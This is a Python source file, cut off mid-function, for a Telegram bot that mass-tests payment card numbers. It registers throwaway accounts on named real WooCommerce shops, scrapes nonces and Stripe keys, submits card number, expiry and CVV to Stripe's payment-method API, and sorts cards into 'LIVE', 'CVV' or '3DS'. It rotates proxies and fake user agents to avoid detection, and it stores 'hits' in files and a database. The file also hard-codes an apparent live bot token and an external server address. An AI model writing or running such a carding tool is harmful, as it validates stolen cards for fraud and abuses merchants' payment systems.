#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AUTO SHOPIFY v12.0 + STRIPE AUTH (PARALLEL PIPELINE)
# OTP = DECLINE - SITIOS APROBADOS GUARDADOS PERMANENTEMENTE

import requests
import json
import re
import time
import random
import os
import socket
import urllib3
import threading
import base64
from datetime import datetime
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import sqlite3
from typing import Dict, List
from queue import Queue
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import uuid
import string
from fake_useragent import UserAgent

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging - SILENT MODE
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# ============================================
# BOT CONFIGURATION
# ============================================
BOT_TOKEN = "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE"
bot = telebot.TeleBot(BOT_TOKEN)

# Data files
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
CARDS_FILE = "cards.json"
HITS_FILE = "hits.json"
PERMANENT_SITES_FILE = "permanent_sites.json"
STRIPE_CARDS_FILE = "stripe_cards.json"
STRIPE_HITS_FILE = "stripe_hits.json"
API_URL = "http://108.165.12.183:8081"
MAX_CARDS_PER_BATCH = 999999

# Concurrency settings
DEFAULT_MAX_WORKERS = 3
REQUEST_TIMEOUT = 25
PROXY_CHECK_TIMEOUT = 3
CACHE_BIN_RESULTS = True

# DELAY ENTRE CHECKS
DELAY_BETWEEN_CHECKS = 5

# Selectable modes
current_mode = "rapido"
mode_workers = {
    "seguro": 1,
    "rapido": 3,
    "extremo": 5
}
PARALLEL_WORKERS = mode_workers[current_mode]

# Update cada 5 cards
UPDATE_BATCH_SIZE = 5

# Proxy checker settings
PROXY_CHECK_WORKERS = 50
PROXY_SOCKET_TIMEOUT = 2

# Rate limit settings
BATCH_SIZE = 10
BATCH_DELAY = 5
last_batch_time = 0
pending_approved = []
batch_lock = threading.Lock()

# Global variables
current_max_workers = DEFAULT_MAX_WORKERS
silent_pc_running = False
silent_pc_thread = None
SILENT_PC_INTERVAL = 7200

# Mass check variables
mass_check_running = False
stripe_mass_running = False
mass_paused = False
current_mass_msg = None
current_mass_chat_id = None
stop_mass_flag = False

# Cache
stored_results = {}
bin_cache = {}
bin_cache_expiry = 3600
hits_list = []
stripe_hits_list = []
last_dead_proxies = []

# Connection pooling - reusable HTTP session
http_session = requests.Session()
http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=10,
    pool_maxsize=20,
    max_retries=requests.adapters.Retry(total=2, backoff_factor=0.3)
)
http_session.mount('http://', http_adapter)
http_session.mount('https://', http_adapter)

# Proxy auto-rotation
failed_proxies = {}
PROXY_FAIL_THRESHOLD = 3
PROXY_FAIL_COOLDOWN = 300

# Site performance tracking
site_stats = {}
SITE_AUTO_CLEAN_INTERVAL = 50
site_check_counter = 0
SITE_MIN_CHECKS = 5
SITE_FAIL_RATE_THRESHOLD = 0.85

# Stripe Auth sites
STRIPE_SITES = [
    "https://prontoheat.com",
    "https://deveneys.ie"
]

# ============================================
# COUNTRY FLAGS
# ============================================

COUNTRY_FLAGS = {
    'AF': '🇦🇫', 'AL': '🇦🇱', 'DZ': '🇩🇿', 'AD': '🇦🇩', 'AO': '🇦🇴', 'AG': '🇦🇬', 'AR': '🇦🇷', 'AM': '🇦🇲',
    'AU': '🇦🇺', 'AT': '🇦🇹', 'AZ': '🇦🇿', 'BS': '🇧🇸', 'BH': '🇧🇭', 'BD': '🇧🇩', 'BB': '🇧🇧', 'BY': '🇧🇾',
    'BE': '🇧🇪', 'BZ': '🇧🇿', 'BJ': '🇧🇯', 'BT': '🇧🇹', 'BO': '🇧🇴', 'BA': '🇧🇦', 'BW': '🇧🇼', 'BR': '🇧🇷',
    'BN': '🇧🇳', 'BG': '🇧🇬', 'BF': '🇧🇫', 'BI': '🇧🇮', 'KH': '🇰🇭', 'CM': '🇨🇲', 'CA': '🇨🇦', 'CV': '🇨🇻',
    'CF': '🇨🇫', 'TD': '🇹🇩', 'CL': '🇨🇱', 'CN': '🇨🇳', 'CO': '🇨🇴', 'KM': '🇰🇲', 'CG': '🇨🇬', 'CD': '🇨🇩',
    'CR': '🇨🇷', 'CI': '🇨🇮', 'HR': '🇭🇷', 'CU': '🇨🇺', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DK': '🇩🇰', 'DJ': '🇩🇯',
    'DM': '🇩🇲', 'DO': '🇩🇴', 'EC': '🇪🇨', 'EG': '🇪🇬', 'SV': '🇸🇻', 'GQ': '🇬🇶', 'ER': '🇪🇷', 'EE': '🇪🇪',
    'ET': '🇪🇹', 'FJ': '🇫🇯', 'FI': '🇫🇮', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GM': '🇬🇲', 'GE': '🇬🇪', 'DE': '🇩🇪',
    'GH': '🇬🇭', 'GR': '🇬🇷', 'GD': '🇬🇩', 'GT': '🇬🇹', 'GN': '🇬🇳', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HT': '🇭🇹',
    'HN': '🇭🇳', 'HU': '🇭🇺', 'IS': '🇮🇸', 'IN': '🇮🇳', 'ID': '🇮🇩', 'IR': '🇮🇷', 'IQ': '🇮🇶', 'IE': '🇮🇪',
    'IL': '🇮🇱', 'IT': '🇮🇹', 'JM': '🇯🇲', 'JP': '🇯🇵', 'JO': '🇯🇴', 'KZ': '🇰🇿', 'KE': '🇰🇪', 'KI': '🇰🇮',
    'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KG': '🇰🇬', 'LA': '🇱🇦', 'LV': '🇱🇻', 'LB': '🇱🇧', 'LS': '🇱🇸',
    'LR': '🇱🇷', 'LY': '🇱🇾', 'LI': '🇱🇮', 'LT': '🇱🇹', 'LU': '🇱🇺', 'MK': '🇲🇰', 'MG': '🇲🇬', 'MW': '🇲🇼',
    'MY': '🇲🇾', 'MV': '🇲🇻', 'ML': '🇲🇱', 'MT': '🇲🇹', 'MH': '🇲🇭', 'MR': '🇲🇷', 'MU': '🇲🇺', 'MX': '🇲🇽',
    'FM': '🇫🇲', 'MD': '🇲🇩', 'MC': '🇲🇨', 'MN': '🇲🇳', 'ME': '🇲🇪', 'MA': '🇲🇦', 'MZ': '🇲🇿', 'MM': '🇲🇲',
    'NA': '🇳🇦', 'NR': '🇳🇷', 'NP': '🇳🇵', 'NL': '🇳🇱', 'NZ': '🇳🇿', 'NI': '🇳🇮', 'NE': '🇳🇪', 'NG': '🇳🇬',
    'NO': '🇳🇴', 'OM': '🇴🇲', 'PK': '🇵🇰', 'PW': '🇵🇼', 'PS': '🇵🇸', 'PA': '🇵🇦', 'PG': '🇵🇬', 'PY': '🇵🇾',
    'PE': '🇵🇪', 'PH': '🇵🇭', 'PL': '🇵🇱', 'PT': '🇵🇹', 'QA': '🇶🇦', 'RO': '🇷🇴', 'RU': '🇷🇺', 'RW': '🇷🇼',
    'KN': '🇰🇳', 'LC': '🇱🇨', 'VC': '🇻🇨', 'WS': '🇼🇸', 'SM': '🇸🇲', 'ST': '🇸🇹', 'SA': '🇸🇦', 'SN': '🇸🇳',
    'RS': '🇷🇸', 'SC': '🇸🇨', 'SL': '🇸🇱', 'SG': '🇸🇬', 'SK': '🇸🇰', 'SI': '🇸🇮', 'SB': '🇸🇧', 'SO': '🇸🇴',
    'ZA': '🇿🇦', 'SS': '🇸🇸', 'ES': '🇪🇸', 'LK': '🇱🇰', 'SD': '🇸🇩', 'SR': '🇸🇷', 'SZ': '🇸🇿', 'SE': '🇸🇪',
    'CH': '🇨🇭', 'SY': '🇸🇾', 'TW': '🇹🇼', 'TJ': '🇹🇯', 'TZ': '🇹🇿', 'TH': '🇹🇭', 'TL': '🇹🇱', 'TG': '🇹🇬',
    'TO': '🇹🇴', 'TT': '🇹🇹', 'TN': '🇹🇳', 'TR': '🇹🇷', 'TM': '🇹🇲', 'TV': '🇹🇻', 'UG': '🇺🇬', 'UA': '🇺🇦',
    'AE': '🇦🇪', 'GB': '🇬🇧', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VU': '🇻🇺', 'VA': '🇻🇦', 'VE': '🇻🇪',
    'VN': '🇻🇳', 'YE': '🇾🇪', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}

# ============================================
# SQLITE DATABASE CLASS
# ============================================

class SQLiteBackup:
    def __init__(self, db_path: str = "shopify_bot_backup.db"):
        self.db_path = db_path
        self.conn = None
        self.setup_database()
    
    def get_connection(self):
        if self.conn is None:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
        return self.conn
    
    def setup_database(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS hits_backup (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT NOT NULL,
                month TEXT NOT NULL,
                year TEXT NOT NULL,
                cvv TEXT NOT NULL,
                category TEXT NOT NULL,
                status_msg TEXT,
                response_msg TEXT,
                gateway TEXT,
                price TEXT,
                elapsed REAL,
                bin_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS stripe_hits_backup (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT NOT NULL,
                month TEXT NOT NULL,
                year TEXT NOT NULL,
                cvv TEXT NOT NULL,
                category TEXT NOT NULL,
                status_msg TEXT,
                response_msg TEXT,
                gateway TEXT,
                price TEXT,
                elapsed REAL,
                bin_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS stats_daily (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT UNIQUE NOT NULL,
                total_checks INTEGER DEFAULT 0,
                total_approved INTEGER DEFAULT 0,
                total_declined INTEGER DEFAULT 0,
                total_errors INTEGER DEFAULT 0,
                stripe_checks INTEGER DEFAULT 0,
                stripe_approved INTEGER DEFAULT 0,
                mode_used TEXT DEFAULT 'fast'
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS permanent_sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE NOT NULL,
                success_count INTEGER DEFAULT 1,
                first_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_timestamp ON hits_backup(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_category ON hits_backup(category)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_cc ON hits_backup(cc)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_timestamp ON stripe_hits_backup(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_category ON stripe_hits_backup(category)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_permanent_sites_url ON permanent_sites(url)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stats_daily_date ON stats_daily(date)")
        
        conn.commit()
    
    def save_hit_backup(self, hit_data: Dict, gateway: str = "shopify"):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if gateway == "stripe_auth":
            table = "stripe_hits_backup"
        else:
            table = "hits_backup"
        
        cursor.execute(f"""
            INSERT INTO {table} (cc, month, year, cvv, category, status_msg, 
                           response_msg, gateway, price, elapsed, bin_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            hit_data.get('cc', ''), hit_data.get('month', ''), 
            hit_data.get('year', ''), hit_data.get('cvv', ''),
            hit_data.get('category', ''), hit_data.get('status_msg', ''), 
            hit_data.get('response_msg', ''),
            hit_data.get('gateway', ''), hit_data.get('price', '$0.95'),
            hit_data.get('elapsed', 0), json.dumps(hit_data.get('bin_info', {}))
        ))
        
        conn.commit()
    
    def update_daily_stats(self, total_checks: int, approved: int, declined: int, errors: int, 
                           stripe_checks: int = 0, stripe_approved: int = 0,
                           mode: str = "fast"):
        conn = self.get_connection()
        cursor = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute("""
            INSERT INTO stats_daily (date, total_checks, total_approved, total_declined, total_errors, 
                                     stripe_checks, stripe_approved, mode_used)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(date) DO UPDATE SET
                total_checks = total_checks + excluded.total_checks,
                total_approved = total_approved + excluded.total_approved,
                total_declined = total_declined + excluded.total_declined,
                total_errors = total_errors + excluded.total_errors,
                stripe_checks = stripe_checks + excluded.stripe_checks,
                stripe_approved = stripe_approved + excluded.stripe_approved,
                mode_used = excluded.mode_used
        """, (today, total_checks, approved, declined, errors, stripe_checks, stripe_approved, mode))
        conn.commit()
    
    def add_permanent_site(self, url: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO permanent_sites (url, success_count, last_success)
            VALUES (?, 1, CURRENT_TIMESTAMP)
            ON CONFLICT(url) DO UPDATE SET
                success_count = success_count + 1,
                last_success = CURRENT_TIMESTAMP
        """, (url,))
        conn.commit()
    
    def is_permanent_site(self, url: str) -> bool:
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT 1 FROM permanent_sites WHERE url = ?", (url,))
        return cursor.fetchone() is not None
    
    def get_permanent_sites(self) -> List[Dict]:
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT url, success_count, first_success, last_success FROM permanent_sites ORDER BY success_count DESC")
        return [dict(row) for row in cursor.fetchall()]
    
    def get_today_stats(self) -> Dict:
        conn = self.get_connection()
        cursor = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute("SELECT * FROM stats_daily WHERE date = ?", (today,))
        row = cursor.fetchone()
        if row:
            return dict(row)
        return {"total_checks": 0, "total_approved": 0, "total_declined": 0, "total_errors": 0, 
                "stripe_checks": 0, "stripe_approved": 0, "mode_used": "fast"}

sqlite_backup = SQLiteBackup()

# ============================================
# STRIPE AUTH FUNCTIONS (CON TIEMPO REAL CORREGIDO)
# ============================================

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def normalize_url_stripe(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('/')
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url

def get_random_stripe_site():
    return random.choice(STRIPE_SITES)

async def check_stripe_auth_async(cc, month, year, cvv, site_url, start_time):
    """Stripe Auth Gateway - GRATIS (solo validación) - Con tiempo real desde el inicio"""
    ua = UserAgent()
    
    card_data = {
        'number': cc,
        'exp_month': month,
        'exp_year': year[-2:] if len(year) == 4 else year,
        'cvc': cvv
    }
    
    try:
        base_url = normalize_url_stripe(site_url)
        
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            email = generate_random_email()
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random,
            }
            
            resp = await session.get(base_url, headers=headers)
            resp_text = await resp.text()
            
            register_nonce = (
                gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
            )
            
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': base_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                
                await session.post(base_url, headers=headers, data=register_data)
            
            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers)
            payment_page_text = await resp.text()
            
            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
            pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message', 'Unknown error')
                error_code = pm_json['error'].get('code', 'unknown')
                
                if 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower():
                    return ("CVV", f"❌ CVV incorrecto", error_msg, "FREE", "STRIPE-AUTH")
                elif 'insufficient' in error_msg.lower():
                    return ("LIVE", f"⚠️ LIVE - Fondos insuficientes", error_msg, "FREE", "STRIPE-AUTH")
                elif 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
                    return ("3DS", f"✅ 3DS Required - Tarjeta válida", error_msg, "FREE", "STRIPE-AUTH")
                else:
                    return ("DECLINED", f"❌ Declinado", error_msg, "FREE", "STRIPE-AUTH")
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return ("ERROR", "❌ Failed to create Payment Method", str(pm_json), "FREE", "STRIPE-AUTH")
            
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                
                endp['data']['wc-stripe-payment-type'] = 'card'
                
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
                    text = await res.text()
                    
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            response_parts = []
                            if status:
                                response_parts.append(f"Status: {status}")
                            if js.get('data', {}).get('payment_method'):
                                response_parts.append(f"PM: {js['data']['payment_method']}")
                            
                            full_response = " | ".join(response_parts) if response_parts else "succeeded"
                            
                            if status == 'succeeded':
                                return ("LIVE", "✅ LIVE - Card added successfully", full_response, "FREE", "STRIPE-AUTH")
                            elif status == 'requires_action' or status == 'requiresaction':
                                return ("3DS", "✅ 3DS Required - Valid card", full_response, "FREE", "STRIPE-AUTH")
                            return ("LIVE", f"✅ LIVE - Status: {status}", full_response, "FREE", "STRIPE-AUTH")
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            error_code = js.get('data', {}).get('error', {}).get('code', 'unknown')
                            if 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
                                return ("3DS", f"✅ 3DS Required", error_msg, "FREE", "STRIPE-AUTH")
                            return ("DECLINED", f"❌ {error_msg}", error_msg, "FREE", "STRIPE-AUTH")
                except:
                    continue
            
            return ("ERROR", "❌ Failed to confirm payment method", pm_id, "FREE", "STRIPE-AUTH")
            
    except Exception as e:
        return ("ERROR", f"❌ System Error: {str(e)}", str(e), "FREE", "STRIPE-AUTH")

def check_stripe_auth(cc, month, year, cvv):
    """Wrapper síncrono para Stripe Auth - TIEMPO REAL CORREGIDO"""
    site_url = get_random_stripe_site()
    start_time = time.time()  # Tiempo real desde el inicio de la función
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_stripe_auth_async(cc, month, year, cvv, site_url, start_time))
        loop.close()
        # Calcular tiempo real transcurrido
        real_elapsed = time.time() - start_time
        # Devolver el resultado con el tiempo real
        return (result[0], result[1], result[2], result[3], result[4], round(real_elapsed, 2))
    except Exception as e:
        real_elapsed = time.time() - start_time
        return ("ERROR", "Failed to check", str(e), "FREE", "STRIPE-AUTH", round(real_elapsed, 2))

# ============================================
# STRIPE AUTH CARD MANAGEMENT
# ============================================

def load_stripe_cards():
    return safe_json_load(STRIPE_CARDS_FILE, [])

def save_stripe_cards(cards):
    return safe_json_save(STRIPE_CARDS_FILE, cards)

def add_stripe_card(cc, month, year, cvv):
    cards = load_stripe_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_stripe_cards(cards)
        return True
    return False

def clear_stripe_cards():
    save_stripe_cards([])

def get_all_stripe_cards():
    return load_stripe_cards()

def delete_stripe_card(card_str):
    cards = load_stripe_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_stripe_cards(cards)
        return True
    return False

def load_stripe_hits():
    return safe_json_load(STRIPE_HITS_FILE, [])

def save_stripe_hit(hit_data):
    hits = load_stripe_hits()
    hits.append(hit_data)
    safe_json_save(STRIPE_HITS_FILE, hits)
    global stripe_hits_list
    stripe_hits_list.append(hit_data)
    try:
        sqlite_backup.save_hit_backup(hit_data, "stripe_auth")
    except:
        pass

def get_stripe_hits():
    global stripe_hits_list
    if not stripe_hits_list:
        stripe_hits_list = load_stripe_hits()
    return stripe_hits_list

# ============================================
# SAFE JSON HANDLING
# ============================================

def safe_json_load(filename, default_value=None):
    if default_value is None:
        default_value = []
    if not os.path.exists(filename):
        return default_value
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if not content:
                return default_value
            return json.loads(content)
    except:
        return default_value

def safe_json_save(filename, data):
    try:
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        temp_file = f"{filename}.tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(json_str)
        if os.path.exists(filename):
            os.remove(filename)
        os.rename(temp_file, filename)
        return True
    except:
        return False

# ============================================
# URL FUNCTIONS
# ============================================

def clean_url(url):
    if not url:
        return None
    url = url.strip()
    url = re.sub(r'^[Ss]ite\s*:\s*', '', url)
    url = re.sub(r'^[Uu][Rr][Ll]\s*:\s*', '', url)
    url = re.sub(r'^[Ww]ebsite\s*:\s*', '', url)
    url = re.sub(r'^[Ll]ink\s*:\s*', '', url)
    url = re.sub(r'^\d+\.\s*', '', url)
    url = url.strip()
    if url and not url.startswith(('http://', 'https://')):
        if '.' in url and ' ' not in url:
            url = 'https://' + url
    return url

def normalize_url(url):
    cleaned = clean_url(url)
    return cleaned if cleaned else None

def extract_url_from_text(text):
    patterns = [
        r'https?://[^\s]+',
        r'[a-zA-Z0-9][a-zA-Z0-9-]*\.[a-zA-Z]{2,}(?:/[^\s]*)?'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            url = match.group(0)
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            return url
    return None

# ============================================
# CARD MANAGEMENT (SHOPIFY)
# ============================================

def load_cards():
    return safe_json_load(CARDS_FILE, [])

def save_cards(cards):
    return safe_json_save(CARDS_FILE, cards)

def add_card(cc, month, year, cvv):
    cards = load_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_cards(cards)
        return True
    return False

def clear_cards():
    save_cards([])

def get_all_cards():
    return load_cards()

def delete_card(card_str):
    cards = load_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_cards(cards)
        return True
    return False

def parse_card_line(line):
    line = line.strip()
    if not line:
        return None
    line = re.sub(r'\s+', '', line)
    if '|' in line:
        parts = line.split('|')
        if len(parts) >= 4:
            cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if len(year) > 2:
                year = year[-2:]
            if len(month) == 1:
                month = f"0{month}"
            return {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    return None

# ============================================
# SITES MANAGEMENT
# ============================================

def load_sites():
    return safe_json_load(SITES_FILE, [])

def save_sites(sites):
    sites = [s for s in sites if s and isinstance(s, str)]
    sites = list(dict.fromkeys(sites))
    return safe_json_save(SITES_FILE, sites)

def add_site(url):
    if not url:
        return False
    cleaned_url = normalize_url(url)
    if not cleaned_url:
        return False
    sites = load_sites()
    if cleaned_url not in sites:
        sites.append(cleaned_url)
        save_sites(sites)
        return True
    return False

def clear_all_sites():
    save_sites([])
    return True

def delete_site_by_index(index):
    sites = load_sites()
    if 1 <= index <= len(sites):
        removed = sites.pop(index - 1)
        save_sites(sites)
        return removed
    return None

def get_random_site():
    sites = load_sites()
    sites = [s for s in sites if s and isinstance(s, str)]
    if not sites:
        return None
    scored = []
    for s in sites:
        if s in site_stats:
            total, success = site_stats[s]
            if total >= SITE_MIN_CHECKS:
                rate = success / total
                scored.append((s, rate))
            else:
                scored.append((s, 0.5))
        else:
            scored.append((s, 0.5))
    scored.sort(key=lambda x: x[1], reverse=True)
    top_count = max(1, len(scored) // 3)
    top_sites = [s for s, _ in scored[:top_count]]
    return random.choice(top_sites)

def fix_all_sites():
    sites = load_sites()
    fixed_sites = []
    for site in sites:
        if site:
            cleaned = normalize_url(site)
            if cleaned and cleaned not in fixed_sites:
                fixed_sites.append(cleaned)
    save_sites(fixed_sites)
    return len(fixed_sites)

# ============================================
# REPORT SITE RESULT
# ============================================

def track_site_performance(url, success):
    """Track site success/failure for smart rotation"""
    if not url:
        return
    if url in site_stats:
        total, wins = site_stats[url]
        site_stats[url] = (total + 1, wins + (1 if success else 0))
    else:
        site_stats[url] = (1, 1 if success else 0)

def auto_clean_dead_sites():
    """Remove non-permanent sites with high failure rate"""
    global site_check_counter
    site_check_counter += 1
    if site_check_counter < SITE_AUTO_CLEAN_INTERVAL:
        return
    site_check_counter = 0
    sites = load_sites()
    removed = []
    for url in list(sites):
        if sqlite_backup.is_permanent_site(url):
            continue
        if url in site_stats:
            total, success = site_stats[url]
            if total >= SITE_MIN_CHECKS:
                fail_rate = 1 - (success / total)
                if fail_rate >= SITE_FAIL_RATE_THRESHOLD:
                    sites.remove(url)
